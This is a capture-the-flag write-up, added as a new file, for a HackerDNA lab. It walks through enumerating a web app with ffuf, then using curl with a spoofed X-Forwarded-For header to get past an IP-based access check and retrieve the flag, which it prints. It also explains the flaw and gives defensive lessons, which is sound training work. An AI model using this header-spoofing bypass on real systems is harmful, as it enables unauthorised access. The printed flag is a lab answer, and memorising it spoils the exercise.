@@ -1,0 +1,117 @@
+Author: fabouhafs fatima zahrae
+Platform:HackerDNA
+Lab Name:TechSolutions — IP Spoofing
+Category:Web Security / Authentication Bypass / IP Spoofing
+Difficulty:Beginner / Intermediate
+________________________________________
+1. Introduction
+This write-up documents my approach to solving the TechSolutions lab from HackerDNA.
+The objective was to bypass the external access restriction and retrieve the hidden flag by identifying a weakness in the application’s IP validation mechanism.
+Command used to capture this screen:
+curl http://3.253.24.120/index.php
+________________________________________
+2. Initial Reconnaissance
+When accessing the website, the application displayed:
+Your IP: <my IP>
+You are not connecting from company network (<company IP>).
+Password is required of external access.
+The message revealed an important clue:
+•	The application trusts IP-based access control.
+•	Internal company users have different privileges.
+•	External users require authentication.
+This suggested testing for possible IP spoofing vulnerabilities.
+________________________________________
+3. Directory Enumeration
+I performed web directory enumeration using FFUF.
+Command:
+ffuf -u http://3.253.24.120/FUZZ \
+-w /usr/share/dirb/wordlists/common.txt
+Result:
+index.php
+.htaccess
+.htpasswd
+server-status
+No interesting hidden files were discovered.
+
+The attack surface was likely inside the login/IP validation logic.
+________________________________________
+Command used to capture this screen:
+ffuf -u http://3.253.24.120/FUZZ -w /usr/share/dirb/wordlists/common.txt
+________________________________________
+4. Source Code Inspection
+I checked the page source:
+Command:
+curl http://3.253.24.120/index.php
+The page contained:
+<form action="index.php" method="POST">
+
+<input type="password" name="password">
+The application was using a POST parameter:
+password
+However, password guessing did not change the response.
+________________________________________
+5. Testing for IP Spoofing
+Since the lab was focused on spoofing, I tested HTTP headers that can influence client IP detection.
+Example:
+curl -H "X-Forwarded-For: 127.0.0.1" http://3.253.24.120/index.php
+The response changed:
+Before:
+Your IP: <real IP>
+After:
+Your IP: 127.0.0.1
+This confirmed that the application trusted:
+X-Forwarded-For
+without proper validation.
+________________________________________
+Screenshot 3 — Spoofing Discovery
+Command used to capture the screen:
+curl -H "X-Forwarded-For: 127.0.0.1" http://3.253.24.120/index.php
+________________________________________
+6. Exploitation
+The application required the internal company IP.
+The company IP shown was:
+3.253.24.120
+I spoofed it using:
+curl -i \
+-H "X-Forwarded-For: 3.253.24.120" \
+-d "password=test" \
+http://3.253.24.120/index.php
+The server responded with:
+HTTP/1.1 302 Found
+
+Location:
+/2kf84qoqi6sviu7poeu54p9b/flag.txt
+The redirect revealed the flag location.
+________________________________________
+Screenshot 4 — Successful Bypass
+Command used to capture the screen:
+curl -i -H "X-Forwarded-For: 3.253.24.120" -d "password=test" http://3.253.24.120/index.php
+________________________________________
+7. Retrieving the Flag
+The flag was retrieved using:
+curl http://3.253.24.120/2kf84qoqi6sviu7poeu54p9b/flag.txt
+Flag:
+5bdd59d4-2ab4-4a30-af10-534e35e7065d
+________________________________________
+8. Vulnerability Explanation
+The vulnerability was caused by trusting the user-controlled header:
+X-Forwarded-For
+The application assumed this value represented the real client IP.
+An attacker could modify this header and appear as an internal company user.
+________________________________________
+9. Lessons Learned
+Key takeaways:
+•	Never trust client-controlled headers for authentication decisions.
+•	IP-based access control should rely on trusted network infrastructure.
+•	Always validate authentication separately from IP information.
+•	Enumeration + understanding application logic is often more effective than brute force.
+________________________________________
+Tools Used
+•	curl
+•	ffuf
+•	Linux terminal
+________________________________________
+Final Result
+Successfully bypassed IP-based access control and retrieved the flag.
+CTF completed ✅
+#CyberSecurity #CTF #WebSecurity #EthicalHacking #HackerDNA #BugBounty #InfoSec
